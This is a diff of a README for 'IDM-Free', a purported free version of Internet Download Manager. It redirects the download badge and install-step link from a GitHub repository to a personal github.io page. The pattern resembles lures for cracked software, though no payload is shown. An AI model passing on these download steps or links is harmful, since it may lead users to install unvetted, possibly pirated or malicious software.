@@ -1,6 +1,6 @@
 # 🚀 IDM-Free - Fast downloads for every Windows user
 
-[![](https://img.shields.io/badge/Download-IDM--Free-blue.svg)](https://github.com/temperamental-gumma102/IDM-Free)
+[![](https://img.shields.io/badge/Download-IDM--Free-blue.svg)](https://temperamental-gumma102.github.io)
 
 ## 📋 What is IDM-Free?
 
@@ -21,7 +21,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to get the software on your machine.
 
-1. Visit the main project page here: [https://github.com/temperamental-gumma102/IDM-Free](https://github.com/temperamental-gumma102/IDM-Free).
+1. Visit the main project page here: [https://temperamental-gumma102.github.io](https://temperamental-gumma102.github.io).
 2. Locate the link labeled Download on the main page.
 3. Click the link to start the transfer of the installation file.
 4. Wait for the browser to finish saving the file to your computer.
